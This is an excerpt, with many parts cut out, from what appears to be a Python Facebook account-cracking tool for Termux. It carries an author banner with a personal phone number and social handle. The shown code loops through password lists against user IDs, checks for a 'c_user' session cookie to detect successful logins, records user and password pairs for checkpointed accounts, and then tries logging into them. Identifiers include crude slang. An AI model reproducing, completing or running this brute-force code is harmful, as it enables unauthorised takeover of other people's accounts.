# code by kazi samir
# my facebook ( https://www.facebook.com/FOURKANUDDIN123 )
...
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m kazi samir          \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m 01817313151          \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mFacebook  : \033[1;92m  FOURKANUDDIN123           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mYoutube  :  \033[1;92m Termux Command 2022\033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m█
\033[1;92m╚═════════════════════════════════════════╝""")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By samir Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}snigdho123{N}")
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[samir-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[samir-CP] ", ""), titid[1])
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[SNIGDHO]","\x1b[1;92m[SNIGDHO]","\x1b[1;92m[SNIGDHO]","\x1b[1;92m[SNIGDHO]","\x1b[1;92m[SNIGDHO]","\x1b[1;92m[SNIGDHO]","\x1b[1;92m[SNIGDHO]"])
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[samir-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
